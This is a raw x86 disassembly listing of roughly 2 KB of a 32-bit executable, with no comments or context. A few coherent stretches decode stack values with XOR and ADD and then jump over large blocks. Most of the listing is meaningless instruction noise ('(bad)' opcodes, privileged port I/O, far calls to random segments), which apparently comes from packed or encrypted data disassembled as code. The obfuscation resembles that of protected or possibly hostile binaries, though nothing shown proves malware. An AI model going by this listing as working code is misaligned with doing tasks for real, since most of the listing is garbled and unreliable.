  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43378b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433793,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4338a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	dec    esi
  408465:	pop    esp
  408466:	scas   al,BYTE PTR es:[edi]
  408467:	stc    
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	arpl   WORD PTR [esi],bp
  408472:	or     al,0xfa
  408474:	xor    eax,DWORD PTR [ebx-0x5951ead2]
  40847a:	cli    
  40847b:	(bad)  
  40847c:	nop
  40847d:	ret    
  40847e:	imul   esi,DWORD PTR [esi+0x10ce59d8],0xe89b1105
  408488:	fidiv  DWORD PTR [ecx-0x492f3108]
  40848e:	mov    bh,0x63
  408490:	out    0xfe,eax
  408492:	outs   dx,BYTE PTR ds:[esi]
  408493:	mov    eax,ds:0x4e18ae4
  408498:	add    al,0x2a
  40849a:	jnp    0x4084c1
  40849c:	lods   al,BYTE PTR ds:[esi]
  40849d:	ins    DWORD PTR es:[edi],dx
  40849e:	and    BYTE PTR [esi+0x9],0xeb
  4084a2:	xchg   esp,eax
  4084a3:	mov    ebp,0xc6fe0346
  4084a8:	popa   
  4084a9:	into   
  4084aa:	mov    ds,WORD PTR [esi+0x36f75feb]
  4084b0:	rol    eax,1
  4084b2:	popa   
  4084b3:	cmp    eax,0x16085c8e
  4084b8:	or     esi,ebp
  4084ba:	mov    eax,0x42d0a465
  4084bf:	mov    al,ds:0x1523e5ac
  4084c4:	xchg   ebx,eax
  4084c5:	call   0x24ad5fb1
  4084ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084cb:	or     eax,0xc1b0401f
  4084d0:	push   0x8a2d212a
  4084d5:	rol    BYTE PTR [esi],1
  4084d7:	idiv   BYTE PTR [esi-0x44c148a0]
  4084dd:	dec    ebp
  4084de:	rol    BYTE PTR [ecx-0x49],cl
  4084e1:	push   0xffffff9f
  4084e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084e4:	aam    0x64
  4084e6:	out    dx,eax
  4084e7:	pop    ds
  4084e8:	div    DWORD PTR [eax-0x24]
  4084eb:	or     esp,DWORD PTR [edx+0x5]
  4084ee:	pop    esi
  4084ef:	mov    eax,ds:0x131ce3b3
  4084f4:	std    
  4084f5:	ret    
  4084f6:	mov    edi,edx
  4084f8:	pop    ecx
  4084f9:	push   0x3c2d6174
  4084fe:	leave  
  4084ff:	daa    
  408500:	fsub   QWORD PTR [ecx]
  408502:	dec    ebx
  408503:	(bad)  
  408504:	cmp    eax,0xdd16ea81
  408509:	(bad)  
  40850a:	call   0x79f07843
  40850f:	dec    ebx
  408510:	push   ds
  408511:	in     eax,dx
  408512:	cmp    edx,DWORD PTR [edx-0x6627739b]
  408518:	mov    ah,0x2d
  40851a:	mov    ah,0x6c
  40851c:	inc    esi
  40851d:	xchg   ebx,eax
  40851e:	jno    0x4084f0
  408520:	inc    ebp
  408521:	mov    bl,ah
  408523:	jno    0x40854b
  408525:	cmp    al,ah
  408527:	arpl   WORD PTR ds:0xc79618b1,bp
  40852d:	test   eax,0x76aea7ba
  408532:	sub    al,0xe1
  408534:	mul    DWORD PTR [edx+0xa3d2651]
  40853a:	ss repz mov esi,0xd14fc74e
  408541:	out    dx,eax
  408542:	fst    DWORD PTR [ecx]
  408544:	add    eax,0xeef7ea79
  408549:	pop    ebp
  40854a:	jmp    0x9292a381
  40854f:	bound  edi,QWORD PTR [edx]
  408551:	mov    ds:0x290b5b60,eax
  408556:	xor    eax,0x524e9ca7
  40855b:	lock mov al,ds:0x18f8fde
  408561:	xor    al,0x6f
  408563:	je     0x408553
  408565:	loope  0x4085de
  408567:	mov    ds:0x5cfbfca,al
  40856c:	dec    eax
  40856d:	cld    
  40856e:	mov    bl,0x16
  408570:	fimul  DWORD PTR [ecx+0x43]
  408573:	jae    0x4085dd
  408575:	push   es
  408576:	scas   eax,DWORD PTR es:[edi]
  408577:	or     eax,0x62dc6fe2
  40857c:	or     eax,0xbd3c1e90
  408581:	sub    ebx,ebp
  408583:	mul    BYTE PTR [eax+ecx*1+0x3a]
  408587:	(bad)  
  40858b:	loope  0x408571
  40858d:	push   eax
  40858e:	and    DWORD PTR [edx],ebp
  408590:	add    esp,ebx
  408592:	aam    0xcc
  408594:	rcr    BYTE PTR [esi+0x7f],1
  408597:	fsubr  QWORD PTR [esp+ebp*8-0x69]
  40859b:	repz jne 0x4085d6
  40859e:	sbb    bl,0x23
  4085a1:	in     eax,dx
  4085a2:	lods   al,BYTE PTR ds:[esi]
  4085a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085a4:	add    edi,DWORD PTR [edx-0x51]
  4085a7:	jne    0x4085d1
  4085a9:	jae    0x408619
  4085ab:	lods   al,BYTE PTR ds:[esi]
  4085ac:	mov    ecx,0xa007ca03
  4085b1:	ins    BYTE PTR es:[edi],dx
  4085b2:	test   al,0xaf
  4085b4:	sub    BYTE PTR [eax-0x43fce939],0x97
  4085bb:	xchg   esp,eax
  4085bc:	test   BYTE PTR [esi-0x9],cl
  4085bf:	shl    DWORD PTR [ecx-0x10a6ddcb],cl
  4085c5:	xlat   BYTE PTR ds:[ebx]
  4085c6:	add    eax,0x580146e9
  4085cb:	cmp    cl,BYTE PTR [ebx+0x48]
  4085ce:	sti    
  4085cf:	inc    dh
  4085d1:	cmp    bl,BYTE PTR [esp+edi*4]
  4085d4:	pusha  
  4085d5:	and    al,0x73
  4085d7:	xchg   ebp,eax
  4085d8:	popa   
  4085d9:	mov    edx,gs
  4085db:	or     al,0x35
  4085dd:	imul   eax,DWORD PTR [eax+0x571eb281],0x21ef330
  4085e7:	call   0x14edc8ad
  4085ec:	add    al,ah
  4085ee:	pop    ds
  4085ef:	std    
  4085f0:	jno    0x408573
  4085f2:	call   0x477f58d5
  4085f7:	and    al,0x10
  4085f9:	cwde   
  4085fa:	add    eax,0x61aa3a3f
  4085ff:	xlat   BYTE PTR ds:[ebx]
  408600:	or     ebp,edx
  408602:	add    al,0x51
  408604:	loop   0x40863f
  408606:	nop
  408607:	addr16 mov eax,0xa73a6b8f
  40860d:	inc    esi
  40860e:	mov    ebp,DWORD PTR [ecx]
  408610:	aaa    
  408611:	rol    BYTE PTR [eax+0x72774db0],0x91
  408618:	push   edx
  408619:	xor    al,0xd7
  40861b:	cmp    al,0x37
  40861d:	pop    ss
  40861e:	mov    eax,0x44cc66ba
  408623:	sub    DWORD PTR [edi+eax*1+0x31],esi
  408627:	inc    ebp
  408628:	das    
  408629:	sbb    eax,DWORD PTR [edx]
  40862b:	sub    BYTE PTR [edx+0x633682d7],bh
  408631:	push   esp
  408632:	push   0x1b5fe2b1
  408637:	sti    
  408638:	icebp  
  408639:	xchg   esp,eax
  40863a:	ret    
  40863b:	es mov edi,0xb4fe01da
  408641:	pop    edx
  408642:	mov    ch,cl
  408644:	stc    
  408645:	or     ebx,DWORD PTR [ebx+0x6b865ff1]
  40864b:	neg    esi
  40864d:	or     BYTE PTR [ecx-0x76],dl
  408650:	pop    ebp
  408651:	scas   al,BYTE PTR es:[edi]
  408652:	xchg   eax,ebp
  408654:	mov    ah,0xf9
  408656:	ins    DWORD PTR es:[edi],dx
  408657:	pop    edx
  408658:	push   ss
  408659:	inc    ebx
  40865a:	or     dl,BYTE PTR [ebx]
  40865c:	clc    
  40865d:	pop    edx
  40865e:	sbb    al,0xfd
  408660:	inc    ch
  408662:	test   eax,0x618c4fed
  408667:	outs   dx,DWORD PTR ds:[esi]
  408668:	mov    ch,0xf7
  40866a:	jg     0x408645
  40866c:	add    dl,dh
  40866e:	dec    ecx
  40866f:	imul   ebx,DWORD PTR [edi+eax*4-0x2d3009af],0xffffffda
  408677:	adc    DWORD PTR [ecx-0x7e],ebx
  40867a:	in     eax,0x9f
  40867c:	stc    
  40867d:	pop    ebx
  40867e:	fstp   TBYTE PTR ds:[ebx-0x724dfa98]
  408685:	mov    esi,0xb30c38e6
  40868a:	sar    DWORD PTR [ebp+0xe8bce9e],1
  408690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408691:	sub    ecx,DWORD PTR [ecx]
  408693:	xchg   BYTE PTR [ecx+0x3c],ch
  408696:	lea    eax,[ebx+eiz*4]
  408699:	idiv   DWORD PTR [ebx-0x71ed0148]
  40869f:	adc    DWORD PTR ds:0x4337e3,0x43377b
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x43386f,0x4338a7
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x49fb2fb6],ecx
  4086ca:	sahf   
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	(bad)  [ebx+0x33]
  4086d6:	popa   
  4086d7:	jle    0x40870d
  4086d9:	imul   DWORD PTR [eax+0x4eb5b95c]
  4086df:	test   DWORD PTR [edx+0x38f15300],ecx
  4086e5:	(bad)  
  4086e7:	and    eax,0x67c2bec
  4086ec:	pop    esp
  4086ed:	lods   eax,DWORD PTR ds:[esi]
  4086ee:	sub    DWORD PTR [edx],eax
  4086f0:	idiv   BYTE PTR [ebp+0x1edaf677]
  4086f6:	cli    
  4086f7:	mov    WORD PTR [ebp+0x49],ds
  4086fa:	xchg   edi,eax
  4086fb:	fistp  DWORD PTR ds:0xa461d171
  408701:	(bad)
  408705:	push   esp
  408706:	je     0x408787
  408708:	xchg   ebp,eax
  408709:	cmp    al,0x91
  40870b:	cmp    DWORD PTR [eax],0xffffffe7
  40870e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40870f:	idiv   DWORD PTR [edx+0x3c2c7693]
  408715:	in     al,dx
  408716:	in     al,0x47
  408718:	dec    edi
  408719:	shl    BYTE PTR [ebx],1
  40871b:	rol    BYTE PTR [edx],cl
  40871d:	stc    
  40871e:	xchg   ebx,eax
  40871f:	into   
  408720:	ret    0x281
  408723:	adc    ebp,ebp
  408725:	cmp    al,0x3a
  408727:	in     eax,dx
  408728:	call   0x7d2d8d7c
  40872d:	push   0xcb9e4e42
  408732:	pop    edi
  408733:	lock fisttp DWORD PTR [ebp+edi*8+0x76]
  408738:	outs   dx,BYTE PTR ds:[esi]
  408739:	pop    eax
  40873a:	inc    esp
  40873b:	push   esp
  40873c:	jne    0x408739
  40873e:	sahf   
  40873f:	retf   
  408740:	sub    eax,0xd30ceaf9
  408745:	(bad)  
  408746:	xor    eax,0xb287df56
  40874b:	or     edi,DWORD PTR [eax+0x2]
  40874e:	adc    eax,0xc00f6562
  408753:	test   BYTE PTR [esi+0x3f],ch
  408756:	mov    edx,0xa164a25f
  40875b:	nop
  40875c:	les    ebx,FWORD PTR [edx+0x4b]
  40875f:	ret    0x879d
  408762:	inc    edi
  408763:	jmp    FWORD PTR [edi+eax*4]
  408766:	out    0xce,eax
  408768:	scas   eax,DWORD PTR es:[edi]
  408769:	call   0x42c1:0xff1416c9
  408770:	imul   DWORD PTR [edi-0x5aaaedc9]
  408776:	lea    edx,[ecx]
  408778:	jmp    0x94e772ed
  40877d:	(bad)  
  40877f:	mov    cl,0xdd
  408781:	jecxz  0x408752
  408783:	stos   DWORD PTR es:[edi],eax
  408784:	xchg   edi,eax
  408785:	inc    edi
  408786:	test   DWORD PTR [ecx+0x3a],esi
  408789:	jle    0x408735
  40878b:	push   cs
  40878c:	imul   edx,DWORD PTR [ebp+0x5c],0x70d4282
  408793:	fwait
  408794:	sub    BYTE PTR [ecx+0x15a1d6be],0x40
  40879b:	pop    esp
  40879c:	push   edi
  40879d:	lods   al,BYTE PTR ds:[esi]
  40879e:	fnstenv [edx-0x3f956224]
  4087a4:	inc    ebp
  4087a5:	inc    ecx
  4087a6:	jbe    0x408769
  4087a8:	stos   DWORD PTR es:[edi],eax
  4087a9:	mov    cl,0x6
  4087ab:	cmp    BYTE PTR [esi-0x1],cl
  4087ae:	jmp    FWORD PTR [edx+0x24bd9a2a]
  4087b4:	mov    bh,0xbd
  4087b6:	into   
  4087b7:	jmp    0x4087f6
  4087b9:	push   edi
  4087ba:	call   0x2962:0xe33b13f5
  4087c1:	push   ss
  4087c2:	xchg   ecx,eax
  4087c3:	(bad)  
  4087c4:	xchg   ebx,eax
  4087c5:	mov    al,0x2f
  4087c7:	mov    dh,0x28
  4087c9:	pop    ds
  4087ca:	mov    BYTE PTR [edx],dh
  4087cc:	scas   al,BYTE PTR es:[edi]
  4087cd:	or     eax,0x689ed6dc
  4087d2:	stc    
  4087d3:	dec    edx
  4087d4:	fisub  WORD PTR [esi+0x3e1afbed]
  4087da:	test   BYTE PTR [edi+0x13],dh
  4087dd:	ds mov ecx,0x8e301b2f
  4087e3:	es push 0x6b
  4087e6:	xor    dh,BYTE PTR [ebx-0x11]
  4087e9:	xchg   ebp,eax
  4087ea:	cwde   
  4087eb:	into   
  4087ec:	call   0x3058:0xb909b8fa
  4087f3:	sbb    edx,ebx
  4087f5:	ret    
  4087f6:	pop    ebp
  4087f7:	dec    ecx
  4087f8:	add    cl,ah
  4087fa:	aad    0xe7
  4087fc:	pusha  
  4087fd:	loop   0x40885d
  4087ff:	scas   eax,DWORD PTR es:[edi]
  408800:	clc    
  408801:	sahf   
  408802:	mov    bl,BYTE PTR [edi+0x1c2bf8d6]
  408808:	mov    al,BYTE PTR [eax]
  40880a:	cmc    
  40880b:	mov    BYTE PTR [edi],ah
  40880d:	addr16 loope 0x40882b
  408810:	jge    0x4087c0
  408812:	sub    al,0x53
  408814:	mov    esi,0x44afe411
  408819:	arpl   WORD PTR [esi-0x3b],bx
  40881c:	shr    al,1
  40881e:	out    dx,eax
  40881f:	push   eax
  408820:	mov    ah,0x87
  408822:	add    bl,BYTE PTR [ecx+0x33]
  408825:	rcl    BYTE PTR [edi+0x1b],1
  408828:	pop    ebx
  408829:	test   eax,0x5a25e54f
  40882e:	inc    edx
  40882f:	js     0x4088a5
  408831:	std    
  408832:	mov    DWORD PTR [eax-0xa068789],esi
  408838:	push   ecx
  408839:	cwde   
  40883a:	jns    0x40884c
  40883c:	dec    edi
  40883d:	or     DWORD PTR [ecx+0x56704c28],0xffffffc5
  408844:	push   0x44c4cd4b
  408849:	add    dh,BYTE PTR [ebp-0x5b]
  40884c:	add    DWORD PTR [edi+0x37],ebp
  40884f:	cwde   
  408850:	push   edi
  408851:	add    BYTE PTR [eax],0xf1
  408854:	mov    al,0x42
  408856:	sbb    al,0xd
  408858:	xchg   esi,eax
  408859:	jno    0x408888
  40885b:	inc    ecx
  40885c:	test   dl,ch
  40885e:	imul   eax,DWORD PTR [edx+0x5a],0xf98bda1a
  408865:	or     al,0x6b
  408867:	mov    esi,0x40691119
  40886c:	mov    bl,BYTE PTR [ebp-0x2f]
  40886f:	iret   
  408870:	jmp    0x1df2d524
  408875:	mov    WORD PTR [ecx],?
  408877:	mov    bh,0x5d
  408879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40887a:	int    0x6a
  40887c:	xchg   edx,eax
  40887d:	push   es
  40887e:	shl    DWORD PTR [ecx-0x4e4113d7],1
  408884:	enter  0x1c83,0x51
  408888:	and    al,0xf0
  40888a:	dec    ecx
  40888b:	in     al,dx
  40888c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40888d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40888e:	je     0x40882c
  408890:	outs   dx,DWORD PTR ds:[esi]
  408891:	mov    ch,0x4c
  408893:	leave  
  408894:	add    edx,DWORD PTR [esi+0x68]
  408897:	add    al,0x93
  408899:	and    BYTE PTR [ecx+0x1],0x48
  40889d:	rol    BYTE PTR [edi],cl
  40889f:	adc    eax,0x9c880862
  4088a4:	adc    eax,0x4a4a2ef
  4088a9:	ss es push esi
  4088ac:	sub    al,0xfb
  4088ae:	das    
  4088af:	gs es jmp 0x408924
  4088b3:	mov    ebx,0xb0e1c4fc
  4088b8:	out    0x6e,al
  4088ba:	icebp  
  4088bb:	sahf   
  4088bc:	sti    
  4088bd:	xchg   ebx,eax
  4088be:	icebp  
  4088bf:	mov    edx,0xeac0b3f9
  4088c4:	mov    edx,0x9f05168
  4088c9:	dec    edx
  4088ca:	clc    
  4088cb:	(bad)  
  4088cc:	mov    DWORD PTR [edx-0x31],eax
  4088cf:	fcmovu st,st(7)
  4088d1:	mov    ah,0x4b
  4088d3:	(bad)  
  4088d4:	repnz cmp ecx,0x2e4a69c3
  4088db:	gs and eax,0x389fc910
  4088e1:	add    ch,dl
  4088e3:	scas   eax,DWORD PTR es:[edi]
  4088e4:	jno    0x4088fe
  4088e6:	ror    DWORD PTR [edi],cl
  4088e8:	jne    0x4088e0
  4088ea:	outs   dx,DWORD PTR ds:[esi]
  4088eb:	xor    eax,0x4fd11110
  4088f0:	fwait
  4088f1:	mov    bh,0x5
  4088f3:	int3   
  4088f4:	fldlg2 
  4088f6:	std    
  4088f7:	cmp    eax,0xa9644889
  4088fc:	pop    edi
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4337e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43385b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4337d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43379f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4338a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xe70d4f2c
  408968:	cmp    dh,BYTE PTR [eax+0x247e7ed4]
  40896e:	jl     0x4089ee
  408970:	jle    0x408935
  408972:	fmul   DWORD PTR [ebp-0x2263f2b1]
  408978:	add    bl,BYTE PTR [esi-0x47de8c16]
  40897e:	mov    ecx,0xf6e68bc8
  408983:	inc    ebx
  408984:	clc    
  408985:	loope  0x40890e
  408987:	out    0xee,al
  408989:	adc    esp,esi
  40898b:	bound  eax,QWORD PTR ds:0x2849eba5
  408991:	inc    edi
  408992:	scas   eax,DWORD PTR es:[edi]
  408993:	aam    0xb
  408995:	out    dx,eax
  408996:	cmp    ch,BYTE PTR [eax+0x53]
  408999:	push   ds
  40899a:	adc    BYTE PTR [ecx+ebx*4-0x2c],bl
  40899e:	pop    ss
  40899f:	sbb    DWORD PTR [edx+ecx*8],ebp
  4089a2:	(bad)  
  4089a3:	and    al,0xfb
  4089a5:	out    0xe5,eax
  4089a7:	jae    0x408989
  4089a9:	cmp    BYTE PTR [ebx],ah
  4089ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089ac:	int    0xaa
  4089ae:	pop    edx
  4089af:	jmp    0x4e91b491
  4089b4:	inc    esp
  4089b5:	adc    al,0xe
  4089b7:	outs   dx,BYTE PTR ds:[esi]
  4089b8:	imul   DWORD PTR [eax+0x5ec17b9b]
  4089be:	and    ch,BYTE PTR [ecx]
  4089c0:	fmul   QWORD PTR [ecx+ecx*1+0x5f]
  4089c4:	pop    ecx
  4089c5:	and    ebx,eax
  4089c7:	test   BYTE PTR [edi+0x42],dl
  4089ca:	mov    ebp,0x83127bf
  4089cf:	hlt    
  4089d0:	xchg   cl,cl
  4089d2:	out    0x5f,al
  4089d4:	imul   ecx,DWORD PTR [eax+0x2],0xffffff9e
  4089d8:	std    
  4089d9:	cmp    eax,0x1c2d11cb
  4089de:	adc    bh,0xcb
  4089e1:	xchg   esp,eax
  4089e2:	mov    fs,WORD PTR [ecx+0x4b]
  4089e5:	mov    dl,0x10
  4089e7:	in     eax,0x76
  4089e9:	ins    DWORD PTR es:[edi],dx
  4089ea:	add    ebx,edi
  4089ec:	push   ebp
  4089ed:	xlat   BYTE PTR ds:[ebx]
  4089ee:	fdivr  QWORD PTR [eax+ecx*1+0x4c]
  4089f2:	(bad)  
  4089f4:	cmp    dh,BYTE PTR [ecx+0x70]
  4089f7:	int3   
  4089f8:	fwait
  4089f9:	inc    esi
  4089fa:	adc    eax,0x768d917c
  4089ff:	push   ds
  408a00:	inc    eax
  408a02:	push   0xffffffc5
  408a04:	mov    ds:0x1847071d,al
  408a09:	scas   al,BYTE PTR es:[edi]
  408a0a:	inc    eax
  408a0b:	jl     0x408a24
  408a0d:	stc    
  408a0e:	or     BYTE PTR [ebx+0xf6c34b3],ah
  408a14:	adc    BYTE PTR [eax-0x40ca6dc7],0x63
  408a1b:	sti    
  408a1c:	xchg   edx,eax
  408a1d:	and    dh,BYTE PTR [edi-0x119cdc29]
  408a23:	sbb    eax,0x287e658a
  408a28:	loop   0x408a5e
  408a2a:	mov    ch,0xf5
  408a2c:	fisubr WORD PTR [edi+ebx*2-0x4f]
  408a30:	fsubr  DWORD PTR [ebp-0x1b]
  408a33:	adc    BYTE PTR [edx+0xa],ah
  408a36:	in     eax,dx
  408a37:	or     ch,ah
  408a39:	(bad)  
  408a3a:	xor    BYTE PTR [edx],0x4d
  408a3d:	into   
  408a3e:	addr16 ja 0x4089db
  408a41:	test   edi,edx
  408a43:	clc    
  408a44:	and    esi,DWORD PTR [esi+edi*4+0x33b4960]
  408a4b:	inc    eax
  408a4c:	jmp    0xcb2b:0xf56e40cf
  408a53:	test   eax,0x5d0a1b8d
  408a58:	sub    DWORD PTR ds:0xf48213d0,edx
  408a5e:	mov    esi,0x9040c44b
  408a63:	push   esi
  408a64:	adc    ecx,ebp
  408a66:	pusha  
  408a67:	repz push ebp
  408a69:	jmp    0x408a9d
  408a6b:	push   esp
  408a6c:	fmul   st(7),st
  408a6e:	enter  0x6ab8,0x10
  408a72:	div    esi
  408a74:	fxch   st(2)
  408a76:	hlt    
  408a77:	rol    ebx,1
  408a79:	ins    BYTE PTR es:[edi],dx
  408a7a:	mov    ds:0x9913e4,eax
  408a7f:	ss jo  0x408a9a
  408a82:	mov    ?,WORD PTR [edi+ecx*8-0x4c725e28]
  408a89:	jb     0x408b02
  408a8b:	xchg   DWORD PTR [edx+0x54],esi
  408a8e:	jbe    0x408a4c
  408a90:	inc    esi
  408a91:	enter  0x7ed6,0xe7
  408a95:	push   edx
  408a96:	ret    0xcc6b
  408a99:	int    0x3d
  408a9b:	iret   
  408a9c:	add    eax,0xf8176446
  408aa1:	add    al,0x8c
  408aa3:	mov    ch,0x49
  408aa5:	mov    ah,0xcc
  408aa7:	fisub  WORD PTR [ebx+ecx*4]
  408aaa:	cmp    DWORD PTR [eax+0x7a94167b],edi
  408ab0:	in     eax,dx
  408ab1:	lds    edi,FWORD PTR cs:[edi]
  408ab4:	dec    dl
  408ab6:	mov    dh,0xdc
  408ab8:	in     al,0xc8
  408aba:	into   
  408abb:	inc    esp
  408abc:	sub    eax,0x23ad056c
  408ac1:	inc    edi
  408ac2:	pushf  
  408ac3:	and    ah,ch
  408ac5:	push   esi
  408ac6:	mov    cs,WORD PTR [eax+0x74]
  408ac9:	jg     0x408a93
  408acb:	stos   DWORD PTR es:[edi],eax
  408acc:	iret   
  408acd:	cs sub al,0x1e
  408ad0:	fsubr  QWORD PTR [edx-0x47]
  408ad3:	mov    bl,0x9c
  408ad5:	ds push 0xdaf486c7
  408adb:	repz sub DWORD PTR ds:0xf3063290,0x1b8b40c5
  408ae6:	enter  0xfae,0xff
  408aea:	int    0x76
  408aec:	popa   
  408aed:	js     0x408b15
  408aef:	(bad)  
  408af1:	int    0x9a
  408af3:	popa   
  408af4:	repnz in eax,0xf8
  408af7:	xchg   ebp,eax
  408af8:	test   DWORD PTR ds:0x8b536b9c,ecx
  408afe:	pop    ss
  408aff:	mov    dh,0x49
  408b01:	jns    0x408b5c
  408b03:	out    dx,al
  408b04:	sbb    eax,0xdbede127
  408b09:	nop
  408b0a:	and    bl,ah
  408b0c:	mov    ch,0xf1
  408b0e:	nop
  408b0f:	xchg   ecx,eax
  408b10:	sub    DWORD PTR [edi],ebx
  408b12:	out    dx,al
  408b13:	jae    0x408b08
  408b15:	push   esp
  408b16:	dec    eax
  408b17:	sub    DWORD PTR [edi-0x28ae7c3a],ebx
  408b1d:	cmp    al,0xc4
  408b1f:	sub    ch,dl
  408b21:	scas   al,BYTE PTR es:[edi]
  408b22:	add    ebx,DWORD PTR [edx]
  408b24:	std    
  408b25:	add    DWORD PTR [esi+0xa3e482a],edx
  408b2b:	jbe    0x408b27
  408b2d:	mov    ebp,0x3360d1bd
  408b32:	jne    0x408ad8
  408b34:	mov    ch,0x3b
  408b36:	into   
  408b37:	js     0x408af0
  408b39:	aad    0xfb
  408b3b:	scas   al,BYTE PTR es:[edi]
  408b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b3d:	xchg   dh,cl
  408b3f:	arpl   WORD PTR [ebx+ebp*4+0x62],cx
  408b43:	xchg   DWORD PTR [ecx-0x13],esp
  408b46:	(bad)  
  408b48:	dec    edx
  408b49:	neg    DWORD PTR [ebx-0x3ea4f9f2]
  408b4f:	push   ss
  408b50:	dec    ebp
  408b51:	jmp    0x8b55:0x31b48372
  408b58:	push   cs
  408b59:	das    
  408b5a:	pop    ebx
  408b5b:	into   
  408b5c:	inc    esp
  408b5d:	mov    ebx,0x36703abe
  408b62:	add    al,0xc7
  408b64:	xchg   edx,eax
  408b65:	dec    ebp
  408b66:	adc    DWORD PTR [ebp+0x7d],esp
  408b69:	pop    ebp
  408b6a:	pop    esi
  408b6b:	push   0x3d4d7a34
  408b70:	jne    0x408b69
  408b72:	pusha  
  408b73:	inc    edi
  408b74:	stos   DWORD PTR es:[edi],eax
  408b75:	imul   ebx,DWORD PTR [ebp+0x4eb5cb33],0x6edd5920
  408b7f:	push   0x3f32eb43
  408b84:	pushf  
  408b85:	mov    ch,0xb
  408b87:	pop    esp
  408b88:	stos   DWORD PTR es:[edi],eax
  408b89:	into   
  408b8a:	adc    bh,BYTE PTR [edi]
  408b8c:	imul   eax,ecx,0xd
  408b8f:	(bad)  
  408b90:	jnp    0x408bdc
  408b92:	neg    DWORD PTR [ecx+0x13]
  408b95:	xchg   esp,eax
  408b96:	and    edi,DWORD PTR [esi-0x76]
  408b99:	pop    edi
  408b9a:	mov    eax,0x1d850f
  408b9f:	add    BYTE PTR [eax],al
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	mov    ds:0x66592808,eax
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	daa    
  408bfd:	mov    WORD PTR [edx],?
  408bff:	inc    ebp
  408c00:	pop    ds
  408c01:	bnd jbe 0x408b91
  408c04:	dec    esi
  408c05:	cmp    eax,0xe2ac8000
  408c0a:	imul   BYTE PTR [eax+0x74]
  408c0d:	shl    BYTE PTR [ecx+ecx*1-0x7f],cl
  408c11:	push   0xd2b62f68
  408c16:	cmp    dh,BYTE PTR [esi]
  408c18:	mov    gs,WORD PTR [esi+0x15]
  408c1b:	pushf  
  408c1c:	out    0x9f,eax
  408c1e:	adc    eax,eax
  408c20:	js     0x408c6a
  408c22:	pop    eax
  408c23:	in     eax,0x36
  408c25:	add    eax,0xc8a8820
  408c2a:	pop    esi
  408c2b:	into   
  408c2c:	sbb    al,0x62
  408c2e:	(bad)  
